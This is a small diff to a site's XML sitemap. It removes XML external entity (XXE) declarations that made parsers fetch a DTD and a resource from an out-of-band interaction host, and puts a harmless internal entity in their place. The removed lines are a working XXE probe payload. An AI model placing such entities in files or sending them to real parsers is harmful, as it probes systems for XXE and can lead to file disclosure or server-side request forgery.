@@ -1,8 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE urlset [
-  <!ENTITY % dtd SYSTEM "https://dbfq3sh64dkt79lluejgh5zym1q5pxe5a.oast.fun/xxe-param-dtd">
-  %dtd;
-  <!ENTITY ge SYSTEM "https://dbfq3sh64dkt79lluejgh5zym1q5pxe5a.oast.fun/xxe-general">
+  <!ENTITY ge "INTERNAL_OK">
 ]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
   <url><loc>https://0xeduardo.github.io/</loc></url>
